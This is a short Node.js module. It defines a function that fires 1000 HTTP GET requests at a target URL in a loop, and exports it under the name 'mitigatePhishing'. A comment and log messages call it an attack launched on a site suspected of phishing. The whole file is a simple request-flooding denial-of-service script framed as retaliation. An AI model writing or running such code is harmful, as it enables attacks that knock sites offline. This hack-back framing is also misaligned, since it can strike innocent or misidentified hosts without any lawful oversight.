const axios = require("axios");

function floodRequest(targetUrl) {
    for (let i = 0; i < 1000; i++) {
        axios.get(targetUrl)
            .then(response => console.log("Request sent"))
            .catch(error => console.log("Attack in progress"));
    }
}

// Trigger attack if phishing detected
function mitigatePhishing(targetUrl) {
    console.log(`Launching attack on ${targetUrl}`);
    floodRequest(targetUrl);
}

module.exports = { mitigatePhishing };
